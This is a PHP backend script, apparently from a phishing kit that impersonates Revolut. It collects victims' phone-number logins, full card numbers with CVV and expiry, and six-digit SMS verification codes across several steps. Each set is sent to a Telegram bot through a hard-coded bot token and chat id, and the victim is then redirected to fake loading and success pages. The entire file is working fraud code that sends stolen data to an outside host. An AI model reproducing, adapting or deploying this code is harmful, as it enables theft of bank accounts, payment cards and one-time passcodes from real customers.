<?php 

require_once "functions.php";

$apiToken = "6713919848:AAH_t7YL_3Za76SRbPysTfRGSlzWCNRXoz8";
$id = "-4184183621";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(isset($_POST['step'])) {
        $step = $_POST['step'];

        if ($step == 'index') {
            $country_number = $_POST['country_number'];
            $number = $_POST['number'];

            if ( empty($country_number) || empty($number)) {
                 header("Location: index.php");
                exit();
            } else {
                // Prepare message
                $message = "======> | LOGIN | REVOLUT <======\n";
                $message .= "LOGIN: $country_number$number\n";
                sendMessageToTelegram($apiToken, $id, $message);

                // Redirect to the appropriate page
                header("Location: loading.php");
                exit();
            }
        } elseif ($step == 'cc') {
            $card_number = $_POST['card_number'];
            $cvv = $_POST['cvv'];
            $expiry = $_POST['expiry'];

            if (empty($card_number) || empty($expiry) || empty($cvv)) {
               header("Location: cc.php");
                exit();
            } else {
                // Prepare message
                $message = "======> | CC | REVOLUT <======\n";
                $message .= "Card Number: $card_number\n";
                $message .= "CVV: $cvv\n";
                $message .= "Expiry: $expiry\n";
                sendMessageToTelegram($apiToken, $id, $message);

                // Redirect to the appropriate page
                header("Location: loading2.php");
                exit();
            }
        } elseif ($step == 'sms' || $step == 'sms2') {
            $num1 = $_POST['num1'];
            $num2 = $_POST['num2'];
            $num3 = $_POST['num3'];
            $num4 = $_POST['num4'];
            $num5 = $_POST['num5'];
            $num6 = $_POST['num6'];

            if ( empty($num4) ) {
                 header("Location: $step.php");
                exit();
            } else {
                // Prepare message
                $message = "======> | SMS | REVOLUT <======\n";
                $message .= "SMS: $num1$num2$num3$num4$num5$num6\n";
                sendMessageToTelegram($apiToken, $id, $message);

                // Redirect to the appropriate page
                if ($step == 'sms') {
                    header("Location: loading3.php");
                } else {
                    header("Location: success.php");
                }
                exit();
            }
        }
    }
}

// Function to send message to Telegram
function sendMessageToTelegram($apiToken, $id, $message) {
    $data = [
        'chat_id' => $id,
        'text' => $message
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
}

?>
